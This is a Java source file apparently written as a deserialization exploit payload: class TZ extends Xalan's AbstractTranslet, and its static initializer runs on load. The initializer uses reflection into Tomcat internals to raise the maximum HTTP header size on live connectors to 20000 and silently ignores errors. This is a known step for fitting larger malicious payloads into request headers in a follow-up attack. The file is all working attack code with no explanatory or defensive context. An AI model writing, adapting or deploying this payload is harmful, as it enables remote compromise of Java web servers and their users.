import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

@SuppressWarnings("all")
public class TZ extends AbstractTranslet {

    static {
        try {
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            java.lang.reflect.Field reqField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField("headerBufferSize");
            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
            contextField.setAccessible(true);
            headerSizeField.setAccessible(true);
            serviceField.setAccessible(true);
            reqField.setAccessible(true);
            getHandlerMethod.setAccessible(true);
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
            for (int i = 0; i < connectors.length; i++) {
                if (4 == connectors[i].getScheme().length()) {
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
                        for (int j = 0; j < classes.length; j++) {
                            // org.apache.coyote.AbstractProtocol$ConnectionHandler
                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
                                java.lang.reflect.Field globalField = classes[j].getDeclaredField("global");
                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                                globalField.setAccessible(true);
                                processorsField.setAccessible(true);
                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                                for (int k = 0; k < list.size(); k++) {
                                    org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);

                                    org.apache.coyote.Request request = (org.apache.coyote.Request) reqField.get(requestInfo);
                                    java.lang.reflect.Field inputBufferField = org.apache.coyote.Request.class.getDeclaredField("inputBuffer");
                                    inputBufferField.setAccessible(true);
                                    org.apache.coyote.http11.Http11InputBuffer inputBuffer = (org.apache.coyote.http11.Http11InputBuffer)inputBufferField.get(request);

                                    java.lang.reflect.Field headerBufferSizeFiled = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField("headerBufferSize");
                                    headerBufferSizeFiled.setAccessible(true);
                                    // 10000 为修改后的 headersize
                                    headerBufferSizeFiled.set(inputBuffer, 20000);
                                }
                            }
                        }
                        // 10000 为修改后的 headersize
                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(20000);
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}